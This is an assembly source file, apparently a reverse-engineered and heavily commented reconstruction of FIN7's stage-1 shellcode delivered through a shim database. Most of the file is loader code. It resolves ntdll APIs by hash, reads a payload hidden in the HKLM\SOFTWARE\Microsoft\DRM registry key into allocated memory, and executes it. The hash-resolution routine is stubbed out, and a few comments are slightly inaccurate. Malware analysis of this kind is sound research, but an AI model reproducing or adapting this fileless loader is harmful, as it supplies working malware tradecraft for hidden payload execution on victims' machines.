;-------------------------------------------------------------------------------------
; fin7 stage1 shellcode (injected code from shim database)
;
; reverse engineered from the binary
; GetProcAddressByHash is defined in the C class
;
; reversed by Lloyd Macrohon <jl.macrohon@gmail.com>
;
; > nasm -f bin fin7-shellcode.asm

[bits 64]
[org 0]

%define RtlInitUnicodeString 0xb67242fd
%define NtQueryValueKey 0x50df3b21
%define NtAllocateVirtualMemory 0x69a0287f
%define NtFreeVirtualMemory 0x69a0287f
%define NtClose 0x9bd4442f
%define NtOpenKey 0xed686dc1

%define NtCurrentProcess 0xFFFFFFFFFFFFFFFF


; stack variables
%define ObjAttr 0x0f
%define hKey 0x7f
%define BufLen 0x67
%define Buf 0x77
%define RegionSize 0x19

main:
    push rbp
    push rbx
    push rdi
    lea rbp, [rsp - 0x47]           ; set new frame
    sub rsp, 0x90                   ; allocate some stack space 0x49 (0x90-0x47)
    xor edi, edi

    mov ecx, RtlInitUnicodeString   ; find RtlInitUnicodeString
    mov qword [rbp + 0x6f], 0x34    ; var_0x6f = 0x34
    mov [rbp + BufLen], edi         ; BufLen = 0
    call GetProcAddressByHash
    mov rbx, rax                    ; rbx = RtlInitUnicodeString

    call setupdata                  ; rax = L"\REGISTRY\MACHINE\Microsoft\DRM"

    ; x64 fastcall rcx, rdx, r8, r9
    lea rcx, [rbp-1]                ; UNICODE_STRING regPath
    mov rdx, rax                    ; rdx = L"\REGISTRY\MACHINE\Microsoft\DRM"
    call rbx                        ; RtlInitUnicodeString(&tmpVar, L"\REGISTRY...")

    lea rax, [rbp-1]                ; rax=&regPath
    lea ebx, [rdi+0x40]             ; ebx=attr
    mov ecx, NtOpenKey
    call GetProcAddressByHash       ; NtOpenKey

    ; NtOpenKey(keyHandle=rcx, desiredAccess=rdx, objAttr=r8);
    lea r8, [rbp + ObjAttr]         ; objAttr (0x0f)
    lea rcx, [rbp + hKey]           ; hKey (0x7f)

    ; OBJECT_ATTRIBUTES objAttr;                // sizeof(OBJECT_ATTRIBUTES) 24
    ; objAttr.Length = 0x30;                    // +0 sizeof(OBJECT_ATTRIBUTES)
    ; objAttr.RootDirectory = HANDLE;           // +8
    ; objAttr.ObjectName = &regPath;            // +10 UNICODE_STRING
    ; objAttr.Attributes = attr;                // +18 ULONG
    ; objAttr.SecurityDescriptor = NULL;        // +20
    ; objAttr.SecurityQualityOfService = NULL;  // +28

    mov dword [rbp + ObjAttr], 0x30    ; Length: sizeof(OBJECT_ATTRIBUTES) (0x0f)
    mov [rbp + ObjAttr + 0x8], rdi         ; RootDirectory
    mov [rbp + ObjAttr + 0x18], ebx        ; Attributes
    mov [rbp + ObjAttr + 0x10], rax        ; ObjectName 
    mov [rbp + ObjAttr + 0x20], rdi        ; SecurityDescriptor
    mov [rbp + ObjAttr + 0x28], rdi        ; SecurityQualityOfService

    mov edx, 0x20019                ; desiredAccess
    call rax                        ; NtOpenKey

    test eax, eax                   ; check return value of NtOpenKey
    js end                          ; if < 0 goto end

    mov ecx, NtQueryValueKey        ; find NtQueryValueKey function
    call GetProcAddressByHash       ; rax = NtQueryValueKey

    ; NtQueryValueKey(hKey=rcx, valueName=rdx, keyValueInfoClass=r8, 
    ;                 keyValueInfo=r9, length=stack, resultLength=stack)

    lea rcx, [rbp + BufLen]         ; rcx = &bufLen (0x67)
    lea r8d, [rdi + 2]
    mov [rsp + 0x28], rcx           ; [rsp + 0x28] = [rbp + 0x67]
    mov rcx, [rbp + hKey]           ; hKey
    lea rdx, [rbp - 0x11]           ; valueName
    xor r9d, r9d                    ; keyValueInfo = 0
    mov [rsp + 0x20], edi           ; length?? (edi should be 4)
    call NtQueryValueKey

    mov r11d, [rbp + BufLen]        ; r11d = resultLength
    test r11d, r11d                 ; if resultLength == 0:
    jz closekey                     ;      goto closekey

    mov ecx, NtAllocateVirtualMemory
    mov [rbp + Buf], rdi
    mov [rbp - RegionSize], rdi
    call GetProcAddressByHash       ; find NtAllocateVirtualMemory

    ; NtAllocateVirtualMemory(hProc=rcx, baseAddress=rdx, zeroBits=r8,
    ;                         regionSize=r9, allocType=stack1, protect=stack2)
    lea r9, [rbp - RegionSize]      ; regionSize: r9 = [rbp - 0x19]
    lea rdx, [rbp + Buf]            ; baseAddress: rdx = pBuf
    xor r8d, r8d                    ; zeroBits: r8 = 0
    or rcx, NtCurrentProcess        ; hProc: rcx = NtCurrentProcess
    mov [rsp + 0x28], ebx           ; protect
    mov dword [rsp + 0x20], 0x3000  ; allocType: MEM_COMMIT | MEM_RESERVE
    call rax                        ; NtAllocateVirtualMemory

    test eax, eax                   ; if NtAllocateVirtualMemory() < 0
    js closekey                     ;     goto closekey

    mov rbx, [rbp + Buf]            ; baseAddr: rbx = pBuf
    test rbx, rbx                   ; if pBuf == 0:
    jz closekey                     ;     goto closekey

    ; Query key again now that we've allocate buffer
    mov ecx, NtQueryValueKey
    call GetProcAddressByHash

    ; NtQueryValueKey(hKey=rcx, valueName=rdx, keyValueInfoClass=r8, 
    ;                 keyValueInfo=r9, length=stack1, resultLength=stack2)
    lea rcx, [rbp + BufLen]         ; length
    lea r8d, [rdi + 2]
    mov [rsp + 0x28], rcx           ; length
    mov ecx, [rbp + BufLen]         ; resultLength
    lea rdx, [rbp - 0x11]           ; valueName
    mov [rsp + 0x20], ecx           ; resultLength
    mov rcx, [rbp + hKey]           ; hKey
    mov r9, rbx                     ; keyValueInfo

    call rax                        ; NtQueryValueKey

    test eax, eax                   ; if NtQueryValueKey() < 0:
    js closekey                     ;     goto closekey

    mov rax, [rbp + Buf]            ; rax = pData
    add rax, 0x30                   ; call pData[0x30]
    call rax                        ; execute pData[0x30]

    ; cleanup
    mov ecx, NtFreeVirtualMemory
    mov [rbp + BufLen], edi         ; dataLength
    call GetProcAddressByHash

    lea r8, [rbp + BufLen]          ; dataSize
    lea rdx, [rbp + Buf]            ; pData
    mov r9d, 0x8000                 ; MEM_RELEASE
    or rcx, 0xFFFFFFFFFFFFFFFF      ; NtCurrentProcess

    ; NtFreeVirtualMemory(hProc=rcx, baseAddr=rdx, regionSize=r8, freeType=r9)
    call rax

closekey:
    mov ecx, NtClose
    call GetProcAddressByHash
    mov rcx, [rbp + hKey]           ; hKey
    call rax                        ; NtClose(hKey)

end:
    xor eax, eax
    add rsp, 0x90
    pop rdi
    pop rbx
    pop rbp
    retn

GetProcAddressByHash:
    ; see fin7-reversed.cpp for implementation of this
    ; written in C rather than also trying to annotate disassembly here as
    ; that's a lot easier to read than assembly
    retn

setupdata:
    nop
    nop
    nop
    call getdataaddr        ; return Data in rax

Data:
reg db '\', 0, 'R', 0, 'E', 0, 'G', 0, 'I', 0, 'S', 0, 'T', 0, 'R', 0, 'Y', 0, 
    db '\', 0, 'M', 0, 'A', 0, 'C', 0, 'H', 0, 'I', 0, 'N', 0, 'E', 0, 
    db '\', 0, 'S', 0, 'O', 0, 'F', 0, 'T', 0, 'W', 0, 'A', 0, 'R', 0, 'E', 0, 
    db '\', 0, 'M', 0, 'i', 0, 'c', 0, 'r', 0, 'o', 0, 's', 0, 'o', 0, 'f', 0, 't', 0, 
    db '\', 0, 'D', 0, 'R', 0, 'M'
    db 0, 0

getdataaddr:
    pop rax         ; save ret address in rax
    retn            ; return back to main
